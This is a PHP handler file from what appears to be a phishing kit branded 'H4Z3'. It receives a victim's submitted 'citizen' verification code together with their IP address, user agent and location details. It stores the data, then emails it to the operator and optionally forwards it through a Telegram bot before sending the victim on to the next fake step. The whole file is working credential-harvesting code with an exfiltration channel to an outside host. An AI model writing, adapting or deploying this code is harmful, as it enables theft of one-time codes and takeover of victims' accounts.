<?php
include '../settings.php';
include 'functions.php';

if (!h4z3_is_step_active('code')) {
    header('Location: ' . h4z3_get_first_step_path('../'));
    exit;
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $code = $_POST['code'];
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $ip = getenv("REMOTE_ADDR");

    h4z3_store_submission('code', $_POST);

            $body  = "++++++++++ 🐱‍💻 CITIZEN CODE INFO 🐱‍💻 ++++++++++\r\n";
            $body .= "Verification Code : $code\r\n";
            $body .= "|--------------- I N F O | I P -------------------|\r\n";
            $body .= "IP          : $ip\r\n";
            $body .= "User Agent  : $user_agent\r\n";
            $body .= "Country     : $cn\r\n";
            $body .= "Region      : $regioncity\r\n";
            $body .= "City        : $citykota\r\n";
            $body .= "OS / BR     : $os / $br\r\n";
            $body .= "Timezone    : $timezone\r\n";
            $body .= "Date        : $date\r\n";
            $body .= "+++++++++++++++ ‍H4Z3 +++++++++++++++\r\n";


      $subject  = "🐱‍💻 ‍H4Z3 CITIZEN CODE INFO => FROM $ip 🐱‍💻";
      $headers  = "From: 🐱‍💻 ‍H4Z3 🐱‍💻 <m4r1ju4n4r3sult@h4z3.com>\r\n";
      $headers .= "MIME-Version: 1.0\r\n";
      $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    if (function_exists('mail')) {
        $mailResult = @mail($to, $subject, $body, $headers);
        if (!$mailResult) {
            h4z3_mark_channel_failure('mail_failed');
        }
    } else {
        h4z3_mark_channel_failure('mail_unavailable');
    }

    if($tgresult == "on"){
        $telegramResult = h4z3_send_telegram($body, $boturl, $chatid);
        if (!$telegramResult) {
            h4z3_mark_channel_failure('telegram_failed');
        }
        }

    $nextStep = h4z3_get_next_step_path('code', '../');
    header('Location: ' . $nextStep);
    exit;
}
?>
